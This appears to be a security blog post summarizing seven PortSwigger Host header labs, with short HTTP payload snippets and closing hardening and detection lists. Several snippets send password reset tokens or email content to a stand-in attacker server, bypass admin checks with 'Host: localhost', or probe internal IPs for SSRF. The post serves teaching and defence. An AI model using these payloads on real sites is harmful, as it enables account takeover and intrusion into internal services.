---
layout: post
title: "Host Is Routing Metadata"
date: 2026-06-28 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [host-header, ssrf, cache-poisoning, portswigger]
related_posts:
  - web-cache-poisoning-is-a-key-boundary-bug
  - information-leaks-are-missing-exploit-parameters
  - request-smuggling-is-a-parser-disagreement
---

The HTTP `Host` header is necessary routing metadata. Trouble starts when applications treat it as identity, local-origin proof, or a safe source for password reset links and script URLs.

The seven PortSwigger Host header labs are all variations on that mistake.

## Host should not generate trust

Password reset poisoning is the cleanest example. A reset flow builds an absolute URL from the request Host. If the attacker sends:

```http
Host: EXPLOIT-SERVER
username=carlos
```

the victim receives a reset link pointing to the attacker's server. The reset token appears in the access log.

The dangling-markup variant shows a different sink. The reset email contains a new password in the body. A non-numeric port breaks raw HTML and creates an unfinished link:

```http
Host: LAB:'<a href="//EXPLOIT-SERVER/?
```

The following email content is swept into a request to the exploit server.

## Localhost is not a role

The auth-bypass lab trusts:

```http
Host: localhost
```

for admin access. That is a category error. Host is a name selected by the client, not proof that the TCP connection came from loopback.

## Ambiguous Host means parser disagreement

The cache-poisoning lab accepts two Host headers:

```http
GET / HTTP/1.1
Host: LAB
Host: EXPLOIT-SERVER
```

One layer validates and keys on the first value. Another layer uses the second value to generate an absolute script URL. That is enough to cache a homepage that imports attacker-controlled JavaScript.

## Host can become SSRF routing

Routing-based SSRF does not need a `url=` parameter. If the front-end routes upstream requests by Host, scanning:

```http
Host: 192.168.0.X
```

can locate an internal admin interface.

Absolute-form request lines add another parser split:

```http
GET https://LAB/admin HTTP/1.1
Host: 192.168.0.X
```

The URL in the request line passes validation; the Host still controls routing.

The connection-state lab adds one more failure mode: validate the first request on a TCP connection, then trust later requests on that connection. Host validation must be per request.

## Defender notes

Hardening:

- enforce a strict Host allowlist at the edge;
- reject multiple Host headers and ambiguous absolute-form requests;
- generate absolute URLs from configured canonical origins;
- never use Host for local/admin authorization;
- align cache keys, routing, and backend URL generation on one canonical Host;
- strip Host override headers unless set by trusted proxies;
- validate Host per request, not per connection;
- context-encode Host-derived values in email and HTML.

Detection:

- Host/SNI/target mismatch;
- multiple Host headers;
- absolute-form requests with internal Host values;
- Host set to localhost or private IP ranges;
- password-reset flows pointing to unexpected domains;
- cached pages importing scripts from unexpected hosts;
- same TCP connection switching from valid Host to internal Host.

Host is allowed to help route the request. It should not decide who the user is, whether the request is local, or where a security-sensitive link should point.
